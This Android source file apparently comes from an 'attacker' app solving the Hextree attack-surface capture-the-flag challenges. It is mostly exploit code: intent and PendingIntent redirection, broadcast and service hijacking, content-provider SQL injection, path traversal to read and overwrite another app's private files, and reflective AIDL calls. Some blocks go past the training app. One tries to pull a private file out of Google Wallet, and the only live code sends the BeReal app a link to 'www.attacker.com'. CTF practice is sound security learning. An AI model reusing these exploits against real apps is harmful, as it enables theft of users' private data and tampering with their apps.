package com.example.attackerapp;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentProviderClient;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.Spinner;

import androidx.activity.EdgeToEdge;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.FileProvider;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Objects;
import java.util.Set;

import io.hextree.attacksurface.services.IFlag28Interface;
import io.hextree.attacksurface.services.IFlag29Interface;

public class MainActivity extends AppCompatActivity {

    Context context;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.home_screen), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        context = this;

        Button secondButton = findViewById(R.id.button2);
        secondButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(MainActivity.this, HextreeActivity.class);
                startActivity(intent);
            }
        });

        Button homeButton = findViewById(R.id.button);
        homeButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.i("pwned", "You have been pwned");

                /* FLAG 1
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag1Activity"));
                startActivity(intent);
                 */

                /* FLAG 2
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag2Activity"));
                intent.setAction("io.hextree.action.GIVE_FLAG");
                startActivity(intent);
                 */

                /* FLAG 3
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag2Activity"));
                intent.setAction("io.hextree.action.GIVE_FLAG");
                intent.setData(Uri.parse("https://app.hextree.io/map/android"));
                startActivity(intent);
                 */

                /* FLAG 4
                Spinner spinner = (Spinner) findViewById(R.id.action_picker);

                ArrayAdapter<CharSequence> adapter = ArrayAdapter.createFromResource(
                        this,
                        R.array.actions,
                        android.R.layout.simple_spinner_item
                );
                adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
                spinner.setAdapter(adapter);

                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag4Activity"));
                intent.setAction(spinner.getSelectedItem().toString());
                startActivity(intent);
                 */

                /* FLAG 5
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag5Activity"));
                Intent intent2 = new Intent();
                intent2.putExtra("return", 42);
                Intent intent3 = new Intent();
                intent3.putExtra("reason", "back");
                intent2.putExtra("nextIntent", intent3);
                intent.putExtra("android.intent.extra.INTENT", intent2);
                startActivity(intent);
                 */

                /* FLAG 6
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag5Activity"));
                Intent intent2 = new Intent();
                intent2.putExtra("return", 42);
                Intent intent3 = new Intent();
                intent3.putExtra("reason", "next");
                intent3.setComponent(new ComponentName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag6Activity"));
                intent3.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                intent2.putExtra("nextIntent", intent3);
                intent.putExtra("android.intent.extra.INTENT", intent2);
                startActivity(intent);
                 */

                /* Flag 7
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag7Activity"));
                intent.setAction("OPEN");
                startActivity(intent);

                Intent intent2 = new Intent();
                intent2.setComponent(new ComponentName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag7Activity"));
                intent2.setAction("REOPEN");
                intent2.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(intent2);
                 */

                /* Flag 12
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag12Activity"));
                intent.putExtra("LOGIN", true);
                startActivity(intent);
                 */

                // Flag 8 & 9 in HextreeActivity
                // Flag 10, 11 & 12 in ReceiverActivity

                /* Flag 22
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("com.example.attackerapp",
                        "com.example.attackerapp.ReceiverActivity"));
                Intent intent2 = new Intent();
                intent2.setComponent(new ComponentName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag22Activity"));
                PendingIntent pendingIntent = PendingIntent.getActivity(MainActivity.this, 0, intent, PendingIntent.FLAG_MUTABLE);
                intent2.putExtra("PENDING", pendingIntent);
                startActivity(intent2);
                 */

                /* Flag 23
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag5Activity"));
                Intent intent2 = new Intent();
                intent2.putExtra("return", 42);
                Intent intent3 = new Intent();
                intent3.putExtra("reason", "next");
                intent3.setComponent(new ComponentName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag23Activity"));
                intent3.setAction("io.hextree.attacksurface.GIVE_FLAG");
                intent3.putExtra("code", 42);
                intent2.putExtra("nextIntent", intent3);
                intent.putExtra("android.intent.extra.INTENT", intent2);
                startActivity(intent);
                 */

                // Flag 13: hex://flag?action=give-me

                /* Flag 30
                Cursor cursor = getContentResolver().query(
                        Uri.parse("content://io.hextree.flag30/success"),
                        null, null,
                        null, null
                );
                dumpUri(cursor);
                 */

                /* Flag 31
                Cursor cursor = getContentResolver().query(
                        Uri.parse("content://io.hextree.flag31/flag/31"),
                        null, null,
                        null, null
                );
                dumpUri(cursor);
                 */

                /* Flag 32
                Cursor cursor = getContentResolver().query(
                        Uri.parse("content://io.hextree.flag32/flags"),
                        null, "1) OR (1=1",
                        null, null
                );
                dumpUri(cursor);
                 */

                /* FLag 33.1
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag33Activity1"));
                intent.setAction("io.hextree.FLAG33");
                startActivityForResult(intent, 1);
                 */

                /* Flag 34
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag34Activity"));
                intent.setAction("io.hextree.FLAG33");
                intent.putExtra("filename", "/flags/flag34.txt");
                startActivityForResult(intent, 1);
                 */

                /* Flag 35 & 36
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag35Activity"));
                intent.setAction("io.hextree.FLAG33");
                intent.putExtra("filename", "../flag35.txt");
                //intent.putExtra("filename", "../shared_prefs/Flag36Preferences.xml");
                startActivityForResult(intent, 1);
                 */

                /* Flag 37
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag37Activity"));
                intent.setData(Uri.parse("content://com.example.attackerapp"));
                startActivity(intent);
                 */

                /* Flag 16
                Intent intent = new Intent();
                intent.putExtra("flag", "give-flag-16");
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag16Receiver");
                sendBroadcast(intent);
                 */

                /* Flag 17
                Intent intent = new Intent();
                intent.putExtra("flag", "give-flag-17");
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag17Receiver");
                sendOrderedBroadcast(intent,null);
                 */

                /* Flag 18
                BroadcastReceiver receiver = new HijackReceiver();
                registerReceiver(receiver, new IntentFilter("io.hextree.broadcast.FREE_FLAG"), Context.RECEIVER_EXPORTED);
                 */

                /* Flag 19
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.receivers.Flag19Widget");
                intent.setAction("APPWIDGET_UPDATE");
                Bundle bundle = new Bundle();
                bundle.putInt("appWidgetMaxHeight", 1094795585);
                bundle.putInt("appWidgetMinHeight", 322376503);
                intent.putExtra("appWidgetOptions", bundle);
                sendBroadcast(intent);
                 */

                /* Flag 20
                Intent intent = new Intent();
                intent.setAction("io.hextree.broadcast.GET_FLAG");
                intent.putExtra("give-flag", true);
                PendingIntent pendingIntent = PendingIntent.getBroadcast(MainActivity.this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
                createNotificationChannel();
                NotificationCompat.Builder builder = new NotificationCompat.Builder(MainActivity.this, "CHANNEL_ID")
                        .setSmallIcon(R.drawable.default_notification_icon)
                        .setContentTitle("My notification")
                        .setContentText("Hello World!")
                        .setPriority(NotificationCompat.PRIORITY_DEFAULT)
                        .addAction(R.drawable.default_notification_icon, "Get Flag", pendingIntent)
                        .setAutoCancel(true);

                if (ActivityCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.POST_NOTIFICATIONS"}, 1);
                    return;
                }
                NotificationManagerCompat.from(MainActivity.this).notify(1, builder.build());
                 */

                /* Flag 24
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.services.Flag24Service");
                intent.setAction("io.hextree.services.START_FLAG24_SERVICE");
                startService(intent);
                 */

                /* Flag 25
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.services.Flag25Service");
                intent.setAction("io.hextree.services.UNLOCK1");
                startService(intent);
                Intent intent2 = new Intent();
                intent2.setClassName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.services.Flag25Service");
                intent2.setAction("io.hextree.services.UNLOCK2");
                startService(intent2);
                Intent intent3 = new Intent();
                intent3.setClassName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.services.Flag25Service");
                intent3.setAction("io.hextree.services.UNLOCK3");
                startService(intent3);
                 */

                /* Flag 26
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.services.Flag26Service");
                bindService(intent, serviceConnection, BIND_AUTO_CREATE);
                 */

                /* Flag 27
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.services.Flag27Service");
                bindService(intent, serviceConnection, BIND_AUTO_CREATE);
                 */

                /* Flag 28
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.services.Flag28Service");
                bindService(intent, serviceConnection, BIND_AUTO_CREATE);
                 */

                /* Flag 29
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.services.Flag29Service");
                bindService(intent, serviceConnection, BIND_AUTO_CREATE);
                 */

                /*

                Intent contextIntent = new Intent();
                contextIntent.setClassName("com.google.android.apps.walletnfcrel",
                        "com.google.android.libraries.phenotype.client.stable.PhenotypeUpdateBackgroundBroadcastReceiver");
                contextIntent.putExtra("com.google.android.gms.phenotype.PACKAGE_NAME", "foo");
                sendBroadcast(contextIntent);

                Intent intent = new Intent();
                intent.setClassName("com.google.android.apps.walletnfcrel",
                        "com.google.android.apps.wallet.infrastructure.notifications.receiver.NotificationBroadcastReceiver");
                intent.setAction("com.google.android.libraries.tapandpay.notification.logging.NOTIFICATION_CONTENT_INTENT");

                Intent inner_intent = new Intent();
                inner_intent.setClassName("com.example.attackerapp", "com.example.attackerapp.HijackReceiver");
                inner_intent.putExtra("data", "Some data");

                String filePath = "/data/data/com.google.android.apps.walletnfcrel/files/gaClientId";
                File file = new File(filePath);
                //String authority = "com.google.android.apps.walletnfcrel.mlkitinitprovider";
                //Uri fileUri = FileProvider.getUriForFile(context, authority, file);
                //inner_intent.setData(fileUri);
                //inner_intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);


                PendingIntent pendingIntent = PendingIntent.getBroadcast(MainActivity.this, 0, inner_intent, PendingIntent.FLAG_IMMUTABLE);
                intent.putExtra("inner_intent", pendingIntent);
                sendBroadcast(intent);
                 */

                Intent intent = new Intent();
                intent.setClassName("com.bereal.ft", "bereal.app.MainActivity");
                intent.setData(Uri.parse("www.attacker.com"));
                startActivity(intent);
            }
        });
    }

    // Flag 27
    private class IncomingHandler extends Handler {
        IncomingHandler() { super(Looper.getMainLooper()); }

        public void handleMessage(Message msg) {
            Log.d("uuid", "Message received: " + msg.toString());
            Bundle receivedBundle = msg.getData();
            String receivedUUID = receivedBundle.getString("password");

            if (receivedUUID != null) {
                Log.d("uuid", receivedUUID);
                Message obtain = Message.obtain((Handler) null, 3);
                Bundle returnBundle = new Bundle();
                returnBundle.putString("password", receivedUUID);
                obtain.setData(returnBundle);
                obtain.replyTo = clientMessenger;
                if (serviceMessenger != null) {
                    try {
                        serviceMessenger.send(obtain); // Send the message
                    } catch (RemoteException e) {
                        e.printStackTrace();
                    }
                } else {
                    Log.d("Service", "Service is not connected yet.");
                }
            } else
                Log.d("uuid", "uuid is null");
        }
    }

    private Messenger serviceMessenger;

    private final Messenger clientMessenger = new Messenger(new IncomingHandler());

    /* Flag 26 & 27 */
    private final ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            /* Flag 26
            Messenger serviceMessenger = new Messenger(service);
            Message msg = Message.obtain(null, 42);
            try {
                serviceMessenger.send(msg);
            } catch (RemoteException e) {
                throw new RuntimeException(e);
            }
            */

            /* Flag 27
            serviceMessenger = new Messenger(service);
            Message msg = Message.obtain(null, 1);
            Bundle sendBundle = new Bundle();
            sendBundle.putString("echo", "give flag");
            msg.setData(sendBundle);

            Message msg2 = Message.obtain(null, 2);
            Bundle sendBundle2 = new Bundle();
            sendBundle2.putString("echo", "give flag");
            msg2.obj = sendBundle2;
            msg2.replyTo = clientMessenger;
            try {
                serviceMessenger.send(msg);
                serviceMessenger.send(msg2);
            } catch (RemoteException e) {
                throw new RuntimeException(e);
            }
            */

            /* Flag 28
            IFlag28Interface remoteService = IFlag28Interface.Stub.asInterface(service);
            try {
                remoteService.openFlag();
            } catch (RemoteException e) {
                throw new RuntimeException(e);
            }
             */

            /* Flag 29
            IFlag29Interface remoteService = IFlag29Interface.Stub.asInterface(service);
            try {
                String pw = remoteService.init();
                remoteService.authenticate(pw);
                remoteService.success();
            } catch (RemoteException e) {
                throw new RuntimeException(e);
            } */
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {

        }
    };

    /* Arbitrary Remote AIDL Service */
    ServiceConnection mConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            try {
                // Load the class dynamically
                ClassLoader classLoader = MainActivity.this.createPackageContext("io.hextree.attacksurface",
                        Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY).getClassLoader();
                Class<?> iRemoteServiceClass = classLoader.loadClass("io.hextree.attacksurface.services.IFlag28Interface");

                Class<?> stubClass = null;
                for (Class<?> innerClass : iRemoteServiceClass.getDeclaredClasses()) {
                    if (innerClass.getSimpleName().equals("Stub")) {
                        stubClass = innerClass;
                        break;
                    }
                }

                // Get the asInterface method
                Method asInterfaceMethod = stubClass.getDeclaredMethod("asInterface", IBinder.class);

                // Invoke the asInterface method to get the instance of IRemoteService
                Object iRemoteService = asInterfaceMethod.invoke(null, service);

                // Call the init method and get the returned string
                Method openFlagMethod = iRemoteServiceClass.getDeclaredMethod("openFlag");
                boolean initResult = (boolean) openFlagMethod.invoke(iRemoteService);

            } catch (PackageManager.NameNotFoundException e) {
                throw new RuntimeException(e);
            } catch (ClassNotFoundException e) {
                throw new RuntimeException(e);
            } catch (InvocationTargetException e) {
                throw new RuntimeException(e);
            } catch (NoSuchMethodException e) {
                throw new RuntimeException(e);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {

        }
    };

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        /* Flag 33.1
        Cursor cursor = getContentResolver().query(
                data.getData(),
                new String[] {"title,content FROM Note UNION SELECT name,value"}, null,
                null, null
        );
        dumpUri(cursor);
         */

        /* Flag 34 & 35
        InputStream inputStream = null;
        try {
            inputStream = getContentResolver().openInputStream(data.getData());
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            String line;
            while ((line = reader.readLine()) != null)
                Log.d("File", line);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
         */

        /* Flag 36
        try {
            OutputStream outputStream = getContentResolver().openOutputStream(data.getData());
            BufferedWriter br = new BufferedWriter(new OutputStreamWriter(outputStream));
            br.write("<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n");
            br.write("<map>\n");
            br.write("   <boolean name=\"solved\" value=\"true\" />\n");
            br.write("</map>\n");
            br.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
         */

    }

    public static void dumpUri(Cursor cursor) {
        if (cursor!=null && cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("evil", sb.toString());
            } while (cursor.moveToNext());
        }
    }


    private void createNotificationChannel() {
        NotificationChannel notificationChannel = new NotificationChannel("CHANNEL_ID", "Hextree Notifications", NotificationManager.IMPORTANCE_DEFAULT);
        notificationChannel.setDescription("Notifications related to various intent attack surface features. Probably good idea to reverse engineer this notification.");
        getSystemService(NotificationManager.class).createNotificationChannel(notificationChannel);
    }

}